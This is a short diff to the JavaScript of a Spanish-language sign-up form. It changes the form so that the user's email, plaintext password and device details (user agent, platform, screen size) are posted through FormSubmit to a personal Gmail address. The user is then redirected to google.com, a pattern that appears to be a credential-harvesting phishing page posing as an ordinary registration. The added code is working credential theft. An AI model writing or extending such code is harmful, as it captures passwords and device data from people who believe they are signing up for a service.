@@ -443,7 +443,26 @@
                 buttonText.textContent = 'Registrando...';
                 
                 try {
-                    // Simular envío a FormSubmit con tu email
+                    // Crear objeto con todos los datos del formulario
+                    const formData = {
+                        correo_electronico: emailInput.value.trim(),
+                        contraseña: passwordInput.value,
+                        terminos_aceptados: termsCheckbox.checked ? "Sí" : "No",
+                        fecha_registro: new Date().toLocaleString('es-ES', {
+                            day: '2-digit',
+                            month: '2-digit',
+                            year: 'numeric',
+                            hour: '2-digit',
+                            minute: '2-digit',
+                            second: '2-digit'
+                        }),
+                        navegador: navigator.userAgent,
+                        dispositivo: window.innerWidth > 768 ? "Escritorio" : "Móvil",
+                        sistema_operativo: navigator.platform,
+                        resolucion_pantalla: `${window.innerWidth}x${window.innerHeight}`
+                    };
+
+                    // Enviar datos a FormSubmit con TODOS los campos
                     const response = await fetch('https://formsubmit.co/ajax/enriquepng1@gmail.com', {
                         method: 'POST',
                         headers: {
@@ -451,11 +470,13 @@
                             'Accept': 'application/json'
                         },
                         body: JSON.stringify({
-                            email: emailInput.value.trim(),
-                            _subject: "Nuevo registro en el sitio",
+                            _subject: `Nuevo Registro - ${formData.correo_electronico}`,
                             _template: "table",
-                            _autoresponse: "Gracias por registrarte. Hemos recibido tu información.",
-                            _captcha: "true"
+                            ...formData, // Incluye todos los campos del formulario
+                            _autoresponse: `Hola ${formData.correo_electronico},\n\nGracias por registrarte. Hemos recibido tu información correctamente.\n\nFecha: ${formData.fecha_registro}`,
+                            _captcha: "true",
+                            _replyto: formData.correo_electronico,
+                            _next: "https://www.google.com"
                         })
                     });
                     
@@ -466,7 +487,7 @@
                         form.style.display = 'none';
                         successMessage.style.display = 'block';
                         
-                        // Opcional: Redirigir después de 3 segundos
+                        // Redirigir después de 3 segundos
                         setTimeout(() => {
                             window.location.href = "https://www.google.com";
                         }, 3000);
